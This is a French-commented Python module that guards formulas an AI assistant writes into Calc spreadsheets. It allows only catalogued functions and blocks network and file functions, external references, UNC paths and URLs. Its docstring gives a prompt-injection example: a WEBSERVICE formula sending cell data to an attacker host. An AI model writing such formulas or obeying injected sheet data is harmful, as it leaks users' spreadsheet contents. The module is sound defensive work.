"""Catalogue des fonctions Calc proposées à l'IA, et garde des formules qu'elle écrit.

Le contexte envoyé au modèle contient des données de la feuille, parfois issues
d'un classeur tiers. Une injection cachée dans ces données pourrait lui faire
écrire =WEBSERVICE("http://attaquant/?d="&A1), qui exfiltre la feuille au premier
recalcul. Avant tout setFormula, une formule ne peut donc appeler que des
fonctions de calcul du catalogue, sans accès réseau ni fichier.
"""

import json
import os
import re

_CATALOG_PATH = os.path.join(os.path.dirname(__file__), "..", "..", "..",
                             "config", "calc-functions.json")

# Refusées même si le catalogue les cite. INDIRECT résout aussi une référence
# externe construite par concaténation, hors de portée des motifs ci-dessous.
NETWORK_OR_FILE_FUNCTIONS = frozenset(
    {"WEBSERVICE", "FILTERXML", "INDIRECT", "HYPERLINK", "DDE"})

# Refusés même dans un texte : références externes ([Classeur.xlsx]Feuille!A1,
# 'fichier'#$Feuille.A1), chemins UNC, qui exposent les identifiants Windows, et URL.
_FORBIDDEN_MARKERS = ("[", "'#", "\\\\", "http://", "https://", "ftp://",
                      "file://", "smb://")

_FUNCTION_CALL = re.compile(r"([A-Za-z_][A-Za-z0-9_.]*)\s*\(")

_catalog = None


def catalog():
    global _catalog
    if _catalog is None:
        try:
            with open(os.path.normpath(_CATALOG_PATH), encoding="utf-8") as fh:
                data = json.load(fh)
            _catalog = {k: v for k, v in data.items() if not k.startswith("_")}
        except Exception:
            _catalog = {}
    return _catalog


def formula_refusal(formula):
    """Raison du refus de *formula*, ou "" si elle peut être écrite. Sans
    catalogue, toute fonction est refusée."""
    lowered = formula.lower()
    for marker in _FORBIDDEN_MARKERS:
        if marker in lowered:
            return f"motif interdit {marker!r}"
    allowed = set(catalog()) - NETWORK_OR_FILE_FUNCTIONS
    called = {name.upper() for name in _FUNCTION_CALL.findall(formula)}
    refused = sorted(called - allowed)
    if refused:
        return "fonction(s) non autorisée(s) : " + ", ".join(refused)
    return ""
